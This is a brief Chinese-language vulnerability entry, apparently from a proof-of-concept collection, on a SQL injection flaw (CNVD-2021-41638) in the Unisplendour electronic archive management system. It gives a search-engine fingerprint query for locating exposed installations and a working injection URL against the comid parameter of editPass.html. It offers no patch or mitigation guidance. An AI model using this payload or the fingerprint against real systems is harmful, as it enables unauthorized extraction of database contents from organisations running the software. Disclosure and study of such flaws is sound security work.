# 紫光档案管理系统 editPass.html SQL注入漏洞 CNVD-2021-41638

## 漏洞描述

紫光软件系统有限公司（以下简称“紫光软件”）是中国领先的行业解决方案和IT服务提供商。
紫光电子档案管理系统存在SQL注入漏洞。攻击者可利用漏洞获取数据库敏感信息。

## 漏洞影响

<a-checkbox checked>紫光电子档案管理系统</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="紫光档案管理系统"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1633168580711-690386c5-48bd-4162-b6ed-763c9f57ee73.png)

验证POC

```java
/login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5(1)))
```

![img](../../../.vuepress/public/img/1633168707994-229d0a0c-dedf-4d6b-9554-da2d9015767a.png)